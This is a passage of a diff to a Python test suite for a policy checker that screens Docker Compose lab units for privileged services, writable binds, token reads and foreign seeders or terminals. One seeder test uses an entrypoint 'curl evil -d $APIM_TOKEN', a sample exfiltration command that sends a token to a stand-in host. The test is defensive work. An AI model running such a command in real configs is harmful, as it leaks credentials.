-        arguments = self.args(CLEAN, audience="public", closure_audiences=["private", "public"])
-        before = copy.deepcopy(arguments)
-        trust.judge(**arguments)
-        self.assertEqual(arguments, before)
-
-
 class Collisions(Golden):
     """T21, from resolve.collisions with what judge says of a unit."""
-
-    def test_t21_a_unit_that_defines_what_an_earlier_one_holds_is_blocked(self):
-        verdict = regen.pipeline(self.root)["t21-name-clash"]
-        self.assertEqual((verdict["state"], verdict["reasons"], verdict["codes"]), ("blocked", ["Same name as Echo"], ["T21"]))
-        self.assertEqual(self.judge("t21-name-clash")["state"], "ok")
-
-    def test_t21_a_unit_whose_names_nobody_holds_is_not(self):
-        verdict = regen.pipeline(self.root)[CLEAN]
-        self.assertNotIn("T21", verdict["codes"])
 
     def test_the_names_a_unit_can_clash_on(self):
         arguments = self.args(CLEAN)
@@ -2198,13 +1480,7 @@ class Collisions(Golden):
 class Notes(Golden):
     """N01 to N05: restrictions that do not block."""
 
-    def test_n01_a_seed_built_from_its_own_folder_is_not_the_labs(self):
-        verdict = self.judge("n01-own-seed-code")
-        self.assertEqual((verdict["state"], verdict["notes"], verdict["surface"]["seed"]), ("ok", [trust.SEED_OWN], "custom"))
-
     def test_n01_the_labs_seeder_is_the_folder_of_the_seeder_or_an_image_the_core_names(self):
-        verdict = self.judge(PLAYGROUND)
-        self.assertEqual((verdict["notes"], verdict["surface"]["seed"]), ([], "official"))
         def image(arguments):
             service = arguments["unit_config"]["services"]["hostile-clean-seed"]
             service["build"] = None
@@ -2225,19 +1501,6 @@ class Notes(Golden):
         verdict = self.changed(PLAYGROUND, edit)
         self.assertEqual((verdict["notes"], verdict["surface"]["seed"]), ([trust.SEED_OWN], "custom"))
 
-    def test_n01_a_unit_with_no_seed_has_none(self):
-        self.assertIsNone(self.judge("p-terminal")["surface"]["seed"])
-        self.assertEqual(self.judge("p-terminal")["notes"], [])
-
-    def test_n01_the_seeders_folder_with_code_of_its_own_is_still_its_own_code(self):
-        """The folder of the seeder is the seeder only when nothing else decides what runs in it: a Dockerfile of the unit's,
-        an entrypoint, a path the interpreter reads from the seed folder. Real Compose output, one unit for each."""
-        for name in ("n01-seeder-own-dockerfile", "n01-seeder-entrypoint", "n01-seeder-pythonpath"):
-            with self.subTest(unit=name):
-                verdict = self.judge(name)
-                self.assertEqual((verdict["state"], verdict["notes"], verdict["surface"]["seed"]), ("ok", [trust.SEED_OWN], "custom"))
-        self.assertEqual(self.judge(PLAYGROUND)["notes"], [])
-
     def seed(self, edit):
         """The clean playground with `edit(seed service, arguments)` applied: the verdict."""
         def both(arguments):
@@ -2245,8 +1508,6 @@ class Notes(Golden):
         return self.changed(PLAYGROUND, both)
 
     def test_n01_every_way_to_run_other_code_under_the_name_of_the_seeder(self):
-        official = self.judge(PLAYGROUND)
-        self.assertEqual((official["notes"], official["surface"]["seed"]), ([], "official"))
         build = lambda **more: (lambda service, arguments: service["build"].update(more))   # noqa: E731
         for label, edit in (
                 ("entrypoint", lambda service, arguments: service.update(entrypoint=["sh", "-c", "curl evil -d $APIM_TOKEN"])),
@@ -2321,13 +1582,6 @@ class Notes(Golden):
             odd["labels"] = {"io.gravitee.role": "seed"}
             self.assertFalse(trust.seeder_ok({"services": {"a": odd}}, roots, [], os.path.realpath), odd)
 
-    def test_n02_seed_data_that_reads_the_token_of_a_deploy(self):
-        verdict = self.judge("n02-seed-reads-token")
-        self.assertEqual((verdict["state"], verdict["notes"]), ("ok", [trust.SEED_TOKEN]))
-
-    def test_n02_a_secret_the_unit_does_not_define_reads_the_token_too(self):
-        self.assertEqual(self.judge("n02-seed-reads-foreign-setting")["notes"], [trust.SEED_TOKEN])
-
     def test_n02_a_secret_the_unit_defines_in_its_own_container_does_not(self):
         def edit(arguments):
             arguments["unit"]["seed_references"] = ["HOSTILE_DEMO_PASSWORD", "HOSTILE_MCP_SECRET", "APIM_GATEWAY_URL"]
@@ -2347,20 +1601,9 @@ class Notes(Golden):
             with self.subTest(name=name):
                 self.assertNotIn(trust.SEED_TOKEN, self.changed(PLAYGROUND, edit, core_variables=[name])["notes"])
 
-    def test_n02_the_patterns_are_the_ones_of_make_check(self):
-        from lab_ui.library import check
-        self.assertEqual(trust.SECRET_NAME.pattern, check.SECRET_NAME.pattern)
-        self.assertEqual(trust.SECRET_NAME.flags, check.SECRET_NAME.flags)
-        self.assertEqual(trust.NOT_SECRET.pattern, check.NOT_SECRET.pattern)
-
-    def test_n03_a_console_that_is_not_on_this_machine_is_not_opened(self):
-        self.assertEqual(self.judge("n03-external-console")["notes"], [line("N03")])
-
-    def test_n03_a_console_on_this_machine_is_fine(self):
-        self.assertEqual(self.judge(CLEAN)["notes"], [])
 
     def test_n03_a_host_check_is_held_to_the_same(self):
-        for url, ok in (("http://localhost:11434/api/tags", True), ("https://huggingface.co", False)):
+        for url, ok in (("http://localhost:11434/api/tags", True), ("https://example.invalid", False)):
             def edit(arguments, url=url):
                 arguments["unit"]["meta"]["requires"] = {"host": [{"name": "x", "check": url}]}
             with self.subTest(url=url):
@@ -2376,11 +1619,6 @@ class Notes(Golden):
                            ("http://[::2]", False), ("http://0.0.0.0", False), ("", False), (None, False), (7, False)):
             with self.subTest(url=url):
                 self.assertEqual(trust.local_address(url), local)
-
-    def test_n04_a_gateway_declared_by_a_catalog_that_is_neither_listed_allowed_nor_local(self):
-        verdict = self.judge("n04-foreign-gateway")
-        self.assertEqual((verdict["state"], verdict["notes"], verdict["surface"]["reads"]), ("ok", [line("N04")], []))
-        self.assertFalse(trust.declared_ok({}))
 
     def test_n04_a_listed_an_allowed_or_a_personal_catalog_may_declare_one_and_the_token_is_said(self):
         for more in ({"listed": True}, {"allowed": True}, {"local": True}):
@@ -2399,33 +1637,17 @@ class Notes(Golden):
             with self.subTest(gateway=gateway):
                 self.assertEqual(self.changed("n04-foreign-gateway", edit)["notes"], [])
 
-    def test_n05_a_terminal_in_a_service_of_the_platform_is_not_offered(self):
-        verdict = self.judge("n05-foreign-terminal")
-        self.assertEqual((verdict["state"], verdict["notes"], verdict["surface"]["shell"]), ("ok", [line("N05")], None))
-
-    def test_n05_a_terminal_in_a_service_of_its_own_is_offered_and_said(self):
-        verdict = self.judge("p-terminal")
-        self.assertEqual((verdict["notes"], verdict["surface"]["shell"]), ([], "hostile-terminal-shell"))
-
     def test_n05_the_terminal_of_a_unit_in_the_services_it_brings_or_not_its_seed(self):
-        arguments = self.args(PLAYGROUND)
-        own = arguments["own"]
-        self.assertTrue(trust.terminal_ok({"meta": {"terminal": "hostile-clean-app"}, "seed": "hostile-clean-seed"}, own, set()))
-        self.assertFalse(trust.terminal_ok({"meta": {"terminal": "hostile-clean-seed"}, "seed": "hostile-clean-seed"}, own, set()))
-        self.assertFalse(trust.terminal_ok({"meta": {"terminal": "hostile-clean-seed"}, "seed": ["hostile-clean-seed"]}, own, set()))
-        self.assertFalse(trust.terminal_ok({"meta": {"terminal": "apim-gateway"}}, own, {"redis"}))
-        self.assertTrue(trust.terminal_ok({"meta": {"terminal": "redis"}}, own, {"redis"}))
-        self.assertTrue(trust.terminal_ok({"meta": {}}, own, set()))
-        self.assertTrue(trust.terminal_ok({"terminal": None, "meta": {"terminal": "apim-gateway"}}, own, set()))
-        self.assertFalse(trust.terminal_ok({"terminal": "apim-gateway"}, own, set()))
-        self.assertTrue(trust.terminal_ok({"meta": {"terminal": {"service": "hostile-clean-app"}}}, own, set()))
-        self.assertTrue(trust.terminal_ok({"meta": {"terminal": ["hostile-clean-app", {"service": "hostile-clean-seed2"}]}}, own + ["hostile-clean-seed2"], set()))
-        for odd in ("", [], {}, 7, [7], {"service": 7}, ["x", None], {"other": "x"}):
-            self.assertFalse(trust.terminal_ok({"meta": {"terminal": odd}}, own, set()), odd)
-
-    def test_the_notes_never_block(self):
-        for name in ("n01-own-seed-code", "n02-seed-reads-token", "n03-external-console", "n04-foreign-gateway", "n05-foreign-terminal"):
-            self.assertEqual(self.judge(name)["state"], "ok", name)
+        offered, refused = [], [line("N05")]
+        for terminal, brought, notes in (("hostile-clean-app", [], offered), ("hostile-clean-seed", [], refused), ("apim-gateway", ["redis"], refused),
+                                         ("redis", ["redis"], offered), (None, [], offered), ("", [], refused), ([], [], refused),
+                                         ({}, [], refused), (7, [], refused), (["hostile-clean-app"], [], refused),
+                                         ({"service": "hostile-clean-app"}, [], refused)):
+            def edit(arguments, terminal=terminal, brought=brought):
+                arguments["unit"]["meta"]["terminal"] = terminal
+                arguments["context"]["closure_services"] = brought
+            with self.subTest(terminal=terminal):
+                self.assertEqual(self.changed(PLAYGROUND, edit)["notes"], notes)
 
     def test_the_notes_of_a_unit_of_this_machine_stay_but_its_gateway_is_its_own(self):
         self.assertEqual(self.judge("n01-own-seed-code", local=True)["notes"], [trust.SEED_OWN])
@@ -2437,36 +1659,24 @@ class Notes(Golden):
 class Surface(Golden):
     """What the preview shows."""
 
-    def test_what_a_clean_unit_will_do(self):
-        surface = self.judge(CLEAN)["surface"]
-        self.assertEqual(surface, {"images": [], "builds": [{"service": "hostile-clean", "source": "local"}], "ports": [8397],
-                                   "core": [], "reads": [], "plugins": [], "seed": None, "shell": None, "uses_machine": [],
-                                   "needs": []})
-
-    def test_the_images_without_their_tags_and_the_builds_by_source(self):
+    def test_the_builds_by_source(self):
         def edit(arguments):
             services = arguments["unit_config"]["services"]
             services["hostile-clean"].pop("build")
-            services["hostile-clean"]["image"] = "registry.invalid:5000/team/app:1.2@sha256:abc"
-            services["other"] = {"image": "redis"}
             services["remote"] = {"build": {"context": "https://user:pw@example.invalid/org/app.git#main"}}
             services["scp"] = {"build": {"context": "git@example.invalid:org/lib.git#0123"}}
             services["short"] = {"build": {"context": "github.com/org/tool"}}
-            arguments["own"] += ["other", "remote", "scp", "short"]
+            arguments["own"] += ["remote", "scp", "short"]
         surface = self.changed(CLEAN, edit)["surface"]
-        self.assertEqual(surface["images"], ["redis", "registry.invalid:5000/team/app"])
         self.assertEqual([(b["service"], b["source"]) for b in surface["builds"]],
                          [("remote", "example.invalid/org/app"), ("scp", "example.invalid/org/lib"), ("short", "github.com/org/tool")])
 
     def test_the_ports_it_publishes_sorted_and_the_ones_with_no_fixed_port_left_out(self):
-        def edit(arguments):
-            arguments["unit_config"]["services"]["hostile-clean"]["ports"] = [
-                {"host_ip": "127.0.0.1", "target": 1, "published": "9000"}, {"host_ip": "127.0.0.1", "target": 1, "published": "8100"},
-                {"host_ip": "127.0.0.1", "target": 1}, "127.0.0.1:9100:1"]
-        self.assertEqual(self.changed(CLEAN, edit)["surface"]["ports"], [8100, 9000])
+        self.assertEqual(self.clean({"ports": [
+            {"host_ip": "127.0.0.1", "target": 1, "published": "9000"}, {"host_ip": "127.0.0.1", "target": 1, "published": "8100"},
+            {"host_ip": "127.0.0.1", "target": 1}, "127.0.0.1:9100:1"]})["surface"]["ports"], [8100, 9000])
 
     def test_what_it_adds_to_the_platform_by_its_label(self):
-        self.assertEqual(self.judge("p-overlay-ok")["surface"]["core"][0]["label"], "Gateway")
         def edit(arguments):
             arguments["overlaid"] = {"redis": {"environment": {"A": "1"}}, "unknown-service": {"labels": {"a": "b"}}}
         core = self.changed("p-overlay-ok", edit)["surface"]["core"]
@@ -2474,19 +1684,15 @@ class Surface(Golden):
         self.assertEqual(core[1]["label"], "unknown-service")
 
     def test_the_plugin_folders_it_mounts(self):
-        def edit(arguments):
-            arguments["unit_config"]["services"]["hostile-clean"]["volumes"] = [
-                {"type": "bind", "source": str(self.root / "plugins/apim"), "target": "/a"},
-                {"type": "bind", "source": str(self.root / "plugins/am/x"), "target": "/b", "read_only": True},
-                {"type": "volume", "source": "plugins", "target": "/c"}]
-        self.assertEqual(self.changed(CLEAN, edit)["surface"]["plugins"], ["am", "apim"])
+        self.assertEqual(self.clean({"volumes": [
+            {"type": "bind", "source": str(self.root / "plugins/apim"), "target": "/a"},
+            {"type": "bind", "source": str(self.root / "plugins/am/x"), "target": "/b", "read_only": True},
+            {"type": "volume", "source": "plugins", "target": "/c"}]})["surface"]["plugins"], ["am", "apim"])
 
     def test_what_it_reads_from_the_machine(self):
-        def edit(arguments):
-            arguments["unit"]["references"] = ["GRAVITEE_LICENSE", "FIXTURE_SHARED_TOKEN", "HOSTILE_X"]
-        verdict = self.changed(CLEAN, edit)
-        self.assertEqual(verdict["surface"]["reads"], ["license", "FIXTURE_SHARED_TOKEN"])
-        self.assertEqual(self.changed(CLEAN, edit, listed=True)["surface"]["reads"], ["license"])
+        reads = {"references": ["GRAVITEE_LICENSE", "FIXTURE_SHARED_TOKEN", "HOSTILE_X"]}
+        self.assertEqual(self.unit(CLEAN, reads)["surface"]["reads"], ["license", "FIXTURE_SHARED_TOKEN"])
+        self.assertEqual(self.unit(CLEAN, reads, listed=True)["surface"]["reads"], ["license"])
 
     def test_what_it_uses_of_this_machine_with_the_authors_reason_cleaned(self):
         def edit(arguments):
@@ -2500,36 +1706,21 @@ class Surface(Golden):
 
     def test_the_label_of_a_service_that_uses_the_machine_is_its_own(self):
         def edit(arguments):
-            arguments["unit_config"]["services"]["hostile-privileged"]["labels"] = {"io.gravitee.name": "Kubernetes"}
-        self.assertEqual(self.changed("t03-privileged", edit)["surface"]["uses_machine"][0]["label"], "Kubernetes")
-
-    def test_the_catalogs_a_unit_includes_from(self):
-        self.assertEqual(self.judge("t24-public-needs-private")["surface"]["needs"], ["partner"])
-        self.assertEqual(self.judge("p-pair")["surface"]["needs"], [])
-
-    def test_the_surface_function_gives_the_surface_of_the_verdict(self):
-        for name in (CLEAN, PLAYGROUND, "n02-seed-reads-token", "h-privileged-declared", "p-overlay-ok", "p-terminal"):
-            arguments = self.args(name, listed=True)
-            context = dict(arguments["context"], unit=arguments["unit"])
-            with self.subTest(unit=name):
-                self.assertEqual(trust.surface(arguments["unit_config"], arguments["core_config"], arguments["own"],
-                                               arguments["overlaid"], arguments["roots"], context),
-                                 trust.judge(**arguments)["surface"])
-        self.assertEqual(trust.surface(None, {}, [], {}, {}, {}), trust.empty_surface())
+            arguments["unit_config"]["services"]["hostile-privileged"]["labels"] = {"io.gravitee.name": "Kookaburra"}
+        self.assertEqual(self.changed("t03-privileged", edit)["surface"]["uses_machine"][0]["label"], "Kookaburra")
 
     def test_surfaces_add_up(self):
-        one = {"images": ["a"], "builds": [{"service": "x", "source": "local"}], "ports": [2, 1], "core": [{"service": "g", "label": "G", "keys": ["environment"]}],
-               "reads": ["license"], "plugins": [], "seed": "official", "shell": None, "uses_machine": [], "needs": ["p"]}
-        two = {"images": ["a", "b"], "builds": [{"service": "x", "source": "local"}, {"service": "y", "source": "local"}], "ports": [1, 3],
+        one = {"builds": [{"service": "x", "source": "local"}], "ports": [2, 1], "core": [{"service": "g", "label": "G", "keys": ["environment"]}],
+               "reads": ["license"], "plugins": [], "seed": "official", "uses_machine": []}
+        two = {"builds": [{"service": "x", "source": "local"}, {"service": "y", "source": "local"}], "ports": [1, 3],
                "core": [{"service": "g", "label": "G", "keys": ["volumes"]}, {"service": "h", "label": "H", "keys": ["ports"]}],
-               "reads": [], "plugins": ["apim"], "seed": "custom", "shell": "s", "uses_machine": [{"service": "k"}], "needs": ["p", "q"]}
+               "reads": [], "plugins": ["apim"], "seed": "custom", "uses_machine": [{"service": "k"}]}
         total = trust.sum_surfaces([one, two])
-        self.assertEqual(total["images"], ["a", "b"])
         self.assertEqual(total["ports"], [1, 2, 3])
         self.assertEqual([b["service"] for b in total["builds"]], ["x", "y"])
         self.assertEqual(total["core"], [{"service": "g", "label": "G", "keys": ["environment", "volumes"]},
                                          {"service": "h", "label": "H", "keys": ["ports"]}])
-        self.assertEqual((total["seed"], total["shell"], total["needs"], total["plugins"]), ("custom", "s", ["p", "q"], ["apim"]))
+        self.assertEqual((total["seed"], total["plugins"]), ("custom", ["apim"]))
         self.assertEqual(trust.sum_surfaces([]), trust.empty_surface())
         self.assertEqual(trust.sum_surfaces([one])["seed"], "official")
         self.assertNotIn(one["core"][0]["keys"], [total["core"][0]["keys"]])
@@ -2572,14 +1763,9 @@ class Vocabulary(Case):
         for code, rule in trust.RULES.items():
             self.assertIn(rule["class"], "PHN")
             self.assertEqual(rule["class"] == "H", code in {f"T{n:02d}" for n in range(3, 12)})
-        self.assertEqual(trust.RULES["T21"]["lines"], ("Same name as {owner}",))
-        self.assertEqual(trust.RULES["T28"]["lines"], ("Uses this machine without saying why: {service}",))
 
     def test_the_words_other_modules_use_are_the_words_of_the_notes(self):
         self.assertEqual((trust.SEED_OWN, trust.SEED_TOKEN), (line("N01"), line("N02")))
-        self.assertEqual(trust.NOT_OFFERED, "Not offered by this catalog")
-        self.assertEqual(line("T21", owner="Echo"), "Same name as Echo")
-        self.assertEqual(line("T26", 1), "Written for an older Gravitee Lab")
 
     def test_no_line_says_a_machine_made_thing(self):
         for rule in trust.RULES.values():
@@ -2691,10 +1877,9 @@ class Vocabulary(Case):
                              ('"\\xZZ"', '"\\xZZ"'), ('"\\U00110000"', '" "'), ("plain", "plain")):
             with self.subTest(text=text):
                 self.assertEqual(trust.unescaped(text), wanted)
-        self.assertFalse(hasattr(trust, "_unescaped"), "one public name")
 
     def test_the_roots_are_real_paths(self):
-        folder = Path(tempfile.mkdtemp()).resolve()
+        folder = self.folder()
         (folder / "real").mkdir()
         os.symlink(folder / "real", folder / "link")
         roots = trust.build_roots(folder / "link", folder / "link" / "unit", [folder / "link" / "sibling"], ("apim",))
@@ -2705,7 +1890,6 @@ class Vocabulary(Case):
         self.assertEqual(roots["seeder"], f"{folder}/real/seeder")
         self.assertEqual(roots["machine"], [f"{folder}/real/{name}" for name in trust.MACHINE_FILES])
         self.assertIsNone(trust.build_roots(folder, None)["unit"])
-        self.assertEqual(trust.build_roots(folder, None, machine=[])["machine"], [])
 
 
 class Verdicts(Golden):
@@ -2734,22 +1918,14 @@ class Verdicts(Golden):
         self.assertLessEqual(max(len(label) for entry in surface["uses_machine"] for label in (entry["label"], entry["why"])), 200)
         for code in ("T01", "T02", "T20", "T22", "T28"):
             self.assertIn(code, verdict["codes"], verdict["reasons"])
-        def many(arguments):
-            arguments["unit"]["references"] = [long + str(number) for number in range(5)]
-        again = self.changed(CLEAN, many)
+        again = self.unit(CLEAN, {"references": [long + str(number) for number in range(5)]})
         self.assertTrue(again["reasons"][-1].endswith("and 2 more"), again["reasons"])   # the count of the rest is never the part that is cut
 
-    def test_what_the_preview_shows_of_an_image_a_build_and_a_setting_is_cut(self):
+    def test_what_the_preview_shows_of_a_build_and_a_setting_is_cut(self):
         long = "z" * 100000
 
-        def edit(arguments):
-            arguments["unit_config"]["services"]["hostile-clean"]["image"] = long + ":1"
-            del arguments["unit_config"]["services"]["hostile-clean"]["build"]
-            arguments["unit"]["references"] = [long]
-        self.assertLessEqual(max(len(image) for image in self.changed(CLEAN, edit, ns="z" * 3)["surface"]["images"]), 120)
-        def build(arguments):
-            arguments["unit_config"]["services"]["hostile-clean"]["build"] = {"context": "github.com/" + long + ".git#" + "a" * 40}
-        self.assertLessEqual(len(self.changed(CLEAN, build)["surface"]["builds"][0]["source"]), 120)
+        built = self.clean({"build": {"context": "github.com/" + long + ".git#" + "a" * 40}})
+        self.assertLessEqual(len(built["surface"]["builds"][0]["source"]), 120)
         def read(arguments):
             arguments["unit"]["references"] = ["HOSTILE_" + long]
             arguments["env"] = {"HOSTILE_" + long}
@@ -2762,7 +1938,6 @@ class Verdicts(Golden):
         combined = trust.combine([self.judge(CLEAN), dict(self.judge("t03-privileged"), name=long)])
         self.assertLess(max(len(reason) for reason in combined["reasons"]), 300)
         self.assertLess(len(trust.add_reason(combined, "T21", line("T21", owner=long))["reasons"][-1]), 300)
-        self.assertEqual(line("T26", 0), "Needs a newer Gravitee Lab")
 
     def test_a_namespace_that_is_a_prefix_of_what_the_person_keeps_is_shown_when_it_is_set(self):
         """T20 passes a name that starts with the namespace of the catalog, so a catalog called like a tool the person keeps a
@@ -2804,26 +1979,22 @@ class Verdicts(Golden):
         verdict = self.judge(CLEAN)
         one = trust.add_reason(verdict, "T21", "Same name as Echo")
         self.assertEqual((one["state"], one["reasons"], one["codes"]), ("blocked", ["Same name as Echo"], ["T21"]))
-        two = trust.add_reason(one, "T21", "Same name as Echo")
-        self.assertEqual(two, one)
+        self.assertEqual(trust.add_reason(one, "T21", "Same name as Echo"), one)
         self.assertEqual(verdict["state"], "ok")
+        self.assertEqual(trust.combine([one, verdict])["reasons"], ["Same name as Echo"], "a closure carries it")
 
     def test_combine_the_worst_of_a_closure(self):
         good, bad = self.judge(CLEAN), self.judge("t12-bind-writable")
         self.assertEqual(trust.combine([good, good])["state"], "ok")
         both = trust.combine([good, bad, bad])
         self.assertEqual(both["reasons"], [line("T25", name="Writable bind")])
-        own = trust.combine([bad, good])
-        self.assertEqual(own["reasons"], [line("T12")])
+        self.assertEqual(trust.combine([bad, good])["reasons"], [line("T12")])
+        self.assertEqual(trust.combine([bad, bad])["reasons"], [line("T12"), line("T25", name="Writable bind")], "its own and its closure's")
         self.assertEqual(trust.combine([])["state"], "ok")
         self.assertEqual(trust.combine([None, good])["state"], "ok")
         notes = trust.combine([self.judge("n03-external-console"), self.judge("n05-foreign-terminal")])
         self.assertEqual(notes["notes"], [line("N03")])
         self.assertEqual(trust.combine([good, dict(bad, name="")])["reasons"], [line("T25", name="a unit")])
-
-    def test_a_unit_that_is_blocked_by_its_own_reasons_and_its_closure_says_both(self):
-        verdict = trust.combine([self.judge("t12-bind-writable"), self.judge("t12-bind-writable")])
-        self.assertEqual(verdict["reasons"], [line("T12"), line("T25", name="Writable bind")])
 
     def test_a_unit_of_this_machine_is_never_blocked_by_the_policy(self):
         for name in ("t03-privileged", "t12-bind-writable", "t17-all-interfaces", "t22-overlay-too-much", "t11-bind-lab-state"):
@@ -2836,11 +2007,6 @@ class Verdicts(Golden):
         arguments = self.args("t12-bind-writable", screened=[line("T19", 0)])
         verdict = trust.judge(**arguments)
         self.assertEqual((verdict["state"], verdict["reasons"], verdict["codes"]), ("blocked", [line("T19", 0)], ["T19"]))
-
-    def test_a_unit_that_compose_could_not_read_is_judged_on_what_is_known(self):
-        verdict = self.judge("t23-include-outside")
-        self.assertEqual(verdict["codes"], ["T23", "T27"])
-        self.assertEqual(verdict["notes"], [])
 
     def test_the_default_context_is_the_narrowest(self):
         arguments = self.args("h-privileged-declared")
@@ -2923,25 +2089,19 @@ class Hostile(Golden):
 
     def test_the_other_functions_are_as_tolerant(self):
         for value in (None, 0, "x", [], {}, [None], {"a": None}, {"services": {"a": 1}}):
-            trust.surface(value, value, [value], value, value, value)
             trust.elevations(value)
             trust.overlays(value, set(), [value])
             trust.combine([value])
             trust.sum_surfaces([trust.empty_surface()])
             trust.seeder_ok(value, value, [value])
-            trust.terminal_ok(value, [value], {value} if isinstance(value, (str, type(None), int)) else set())
 
     def test_a_hostile_unit_cannot_pass_by_a_value_that_looks_like_a_false(self):
         for value in ("false", "0", 0, None, False, ""):
-            def edit(arguments, value=value):
-                arguments["unit_config"]["services"]["hostile-clean"]["privileged"] = value
             with self.subTest(value=value):
-                self.assertEqual(self.changed(CLEAN, edit)["state"], "ok")
+                self.assertEqual(self.clean({"privileged": value})["state"], "ok")
         for value in (True, "true", "True", "yes", "1", "on", " TRUE "):
-            def edit(arguments, value=value):
-                arguments["unit_config"]["services"]["hostile-clean"]["privileged"] = value
             with self.subTest(value=value):
-                self.assertEqual(self.changed(CLEAN, edit)["reasons"], [line("T03")])
+                self.assertEqual(self.clean({"privileged": value})["reasons"], [line("T03")])
 
     def test_a_declaration_cannot_be_forged_through_the_unit_dict_of_another_service(self):
         def edit(arguments):
@@ -2993,9 +2153,6 @@ class Pure(Golden):
         resolve.target_of("x")   # the module is loaded before the world is taken away
         with self.untouched():
             after = {name: trust.judge(**arguments) for name, arguments in cases.items()}
-            for name, arguments in cases.items():
-                trust.surface(arguments["unit_config"], arguments["core_config"], arguments["own"], arguments["overlaid"],
-                              arguments["roots"], dict(arguments["context"], unit=arguments["unit"]))
         self.assertEqual(after, before)
         self.assertGreater(len(after), 40)
 
@@ -3003,8 +2160,6 @@ class Pure(Golden):
         arguments = self.args(PLAYGROUND, realpath=None)
         with self.untouched():
             trust.prescreen("include:\n  - ../a.yml\n", ".lab/catalogs/ns/addons/x/compose.yml")
-            trust.prescreen("services:\n  a:\n    env_file: [a.env, \"b.env\"]\n", ".lab/catalogs/ns/addons/x/compose.yml", follow=True)
-            trust.env_files("services:\n  a:\n    env_file: a.env\n", ".lab/catalogs/ns/addons/x/compose.yml")
             trust.reads(["A=${B}"], {"services": {"a": {"environment": {"C": None}}}})
             resolve.shown("a name", 3)
             resolve.owned_names(arguments["unit_config"], arguments["core_config"], arguments["own"])
@@ -3014,20 +2169,10 @@ class Pure(Golden):
             trust.combine([trust.empty_surface() and {"state": "ok", "reasons": [], "notes": [], "surface": trust.empty_surface()}])
             trust.seed_reads(["${A}"])
             trust.seeder_ok(arguments["unit_config"], arguments["roots"], [])
-            trust.terminal_ok({}, [], set())
             trust.declared_ok({})
             resolve.collisions([], {}, {})
             resolve.closure({}, "addon", "x")
             resolve.catalog_needs({"ns": "a", "includes": []}, {}, [])
-
-    def test_judge_with_the_audiences_of_a_caller_touches_nothing_either(self):
-        arguments = self.args(CLEAN, realpath=None, audience="public", closure_audiences=["private", "public"])
-        before = trust.judge(**copy.deepcopy(arguments))
-        resolve.rank("x")
-        with self.untouched():
-            after = trust.judge(**arguments)
-        self.assertEqual(after, before)
-        self.assertEqual(after["codes"], ["T24"])
 
     def test_judge_leaves_what_it_is_handed_as_it_was(self):
         for name in regen.names():
@@ -3038,11 +2183,6 @@ class Pure(Golden):
             trust.judge(**arguments)
             with self.subTest(unit=name):
                 self.assertEqual(arguments, before)
-
-    def test_judge_is_deterministic(self):
-        for name in ("t03-privileged", CLEAN, PLAYGROUND, "t20-foreign-setting"):
-            arguments = self.args(name)
-            self.assertEqual(trust.judge(**arguments), trust.judge(**arguments))
 
     def test_the_paths_are_resolved_through_the_one_function_it_is_given(self):
         seen = []
@@ -3059,9 +2199,7 @@ class Pure(Golden):
     def test_a_resolver_that_fails_is_a_path_as_written(self):
         def broken(path):
             raise OSError("no")
-        def edit(arguments):
-            arguments["context"]["realpath"] = broken
-        self.assertEqual(self.changed("h-sibling-bind-ro", edit)["state"], "ok")
+        self.assertEqual(self.changed("h-sibling-bind-ro", lambda arguments: arguments["context"].update(realpath=broken))["state"], "ok")
 
     def test_the_module_imports_nothing_that_reads_the_world(self):
         source = Path(trust.__file__).read_text(encoding="utf-8")
